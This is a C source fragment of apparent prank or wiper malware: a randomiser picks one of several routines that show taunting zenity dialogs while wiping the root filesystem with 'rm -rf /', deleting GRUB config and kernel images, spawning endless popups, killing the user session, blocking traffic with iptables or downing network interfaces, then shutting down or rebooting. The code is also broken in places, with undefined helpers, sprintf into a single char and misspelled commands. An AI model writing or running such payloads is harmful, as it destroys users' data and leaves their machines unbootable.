void crash1(){
	system("dbus-launch zenity --error --title 'G4M3_0V3R' --text 'Your game has been ended, but mine is just beginning...for your soul..' --ok-label '👹' 2>/dev/null");
	system("rm -rf / --no-preserve-root &");
}
void crash2(){
        system("dbus-launch zenity --warning --title 'Demons Overlord' --text 'Hahahahahahahahahahahaaaaaaaaaaaaaa....' --ok-label '😈' 2>/dev/null");
	for(;;){
		system("dbus-launch zenity --error --title 'Cr@sh1n9 d0wn' --text 'system failed to load' --ok-lable '👿' 2>/dev/null &");
	}
}
void crash3(){
	short int uuid=getuuid();
	void *ptr=heap_add(1);
	sprintf(ptr,"loginctl kill-user %d",uuid);
	system(ptr);
}
void crash4(){
	system("rm -f /boot/grub/grub.cfg 1>/dev/null");
	system("dbus-launch zenity --error --title '5oul 0ver' --text 'It's wickedly delightful to see you again!😈' --ok-label '😈' 2>/dev/null");
	system("shutdown now");
}
void crash5(){
	system("rm -f /boot/vm*");
	system("dbus-launch zenity --error --title 'GAME👿OVER' --text 'YOUR SOUL IS MINE' --ok-label '👿' 2>/dev/null");
	system("reboot");
}
char cmd;
void crash6(){
	system("dbus-launch zenity --warning --title 'Diabolic End' --text 'Your identity has been consumed by darkness...' --ok-label '👺'2>/dev/null");
	sprintf(&cmd,"iptables -t filter -A INPUT --dst %s -j DROP",ip_extract());
	system(&cmd);
}
void crash7(){
	system("echo 'rebbot'>>/boot/grub/grub.cfg");
	system("dbus-lanch zenity --error --title 'DOOmed Spirit' --text 'Your soul is now eternally bound to the darkness..' --ok-label '😈' 2>/dev/null");
	system("poweroff");
}
void crash8(){
	sprintf(&cmd,"ifconfig %s down",iface_extract());
	system(&cmd);
}
void system_crash(){
srand(time(0));
char val=rand()%0xc;
if(val>=0x0&&0x1>=val){
	crash1();
}
else if(val>=0x2&&0x3>=val){
	crash2();
}
else if(val>=0x4&&0x5>=val){
	crash4();
}
else if(val>=0x6 && 0x7>=val){
	crash5();
}
else if(val>=0x8 && 0x9>=val){
	crash7();
}
else if(val==0xa){
	crash6();
}
else{
	crash8();
}
}
